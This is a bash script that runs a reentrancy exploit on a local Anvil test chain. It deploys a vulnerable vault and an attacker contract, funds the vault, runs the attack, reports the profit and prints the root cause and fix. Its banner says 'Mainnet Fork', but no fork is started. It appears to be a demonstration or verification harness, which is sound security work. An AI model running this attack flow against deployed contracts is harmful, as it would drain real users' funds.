#!/bin/bash
# ORACLE: Reentrancy Exploit Verification Demo

set -e

ANVIL="/home/brad/.foundry/bin/anvil"
FORGE="/home/brad/.foundry/bin/forge"
CAST="/home/brad/.foundry/bin/cast"
RPC="http://127.0.0.1:8547"
PRIVKEY="0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

# Kill any existing anvil
pkill -f anvil 2>/dev/null || true
sleep 1

echo ""
echo "🔥 ORACLE: Mainnet Fork Verification Engine"
echo "============================================================"
echo ""

# Start Anvil
echo "[1] Starting Anvil..."
$ANVIL --port 8547 > /dev/null 2>&1 &
ANVIL_PID=$!
sleep 3

# Check connection
BLOCK=$($CAST block-number --rpc-url $RPC 2>/dev/null || echo "FAILED")
if [ "$BLOCK" == "FAILED" ]; then
    echo "    ❌ Failed to start Anvil"
    exit 1
fi
echo "    ✅ Anvil running at block $BLOCK"

cd /home/brad/TiganticLabz/Main_Projects/physics-os

# Deploy VulnerableVault
echo ""
echo "[2] Deploying VulnerableVault..."
DEPLOY1=$($FORGE create test_contracts/VulnerableVault.sol:VulnerableVault \
    --rpc-url $RPC \
    --private-key $PRIVKEY \
    --broadcast \
    --constructor-args 0x0000000000000000000000000000000000000001 2>&1)
VAULT=$(echo "$DEPLOY1" | grep "Deployed to:" | awk '{print $3}')
echo "    ✅ VulnerableVault: $VAULT"

# Deploy Attacker
echo ""
echo "[3] Deploying ReentrancyAttacker..."
DEPLOY2=$($FORGE create test_contracts/VulnerableVault.sol:ReentrancyAttacker \
    --rpc-url $RPC \
    --private-key $PRIVKEY \
    --broadcast \
    --constructor-args $VAULT 2>&1)
ATTACKER=$(echo "$DEPLOY2" | grep "Deployed to:" | awk '{print $3}')
echo "    ✅ ReentrancyAttacker: $ATTACKER"

# Fund vault with 10 ETH
echo ""
echo "[4] Funding vault with 10 ETH..."
$CAST send $VAULT --value 10ether --rpc-url $RPC --private-key $PRIVKEY >/dev/null 2>&1
VAULT_BAL=$($CAST balance $VAULT --rpc-url $RPC --ether)
echo "    Vault balance: $VAULT_BAL"

# Execute attack
echo ""
echo "[5] Executing reentrancy attack..."
BEFORE=$($CAST balance $ATTACKER --rpc-url $RPC)
echo "    Attacker before: $(python3 -c "print(f'{$BEFORE / 1e18:.4f}')")"

# Call attack() with 1 ETH
$CAST send $ATTACKER "attack()" --value 1ether --rpc-url $RPC --private-key $PRIVKEY >/dev/null 2>&1

AFTER=$($CAST balance $ATTACKER --rpc-url $RPC)
VAULT_AFTER=$($CAST balance $VAULT --rpc-url $RPC --ether)

echo "    Attacker after:  $(python3 -c "print(f'{$AFTER / 1e18:.4f}')")"
echo "    Vault after:     $VAULT_AFTER"

PROFIT=$(python3 -c "print(f'{($AFTER - $BEFORE) / 1e18:.4f}')")

echo ""
echo "============================================================"
if python3 -c "exit(0 if $AFTER > $BEFORE else 1)"; then
    echo "💰 EXPLOIT VERIFIED ON FORK!"
    echo "   Profit: $PROFIT ETH"
    echo ""
    echo "   📍 Attack vector: Reentrancy in withdraw()"
    echo "   🔍 Root cause: External call before state update"  
    echo "   💡 Fix: Move state update before external call"
else
    echo "❌ Attack not profitable"
fi
echo "============================================================"

# Cleanup
kill $ANVIL_PID 2>/dev/null || true
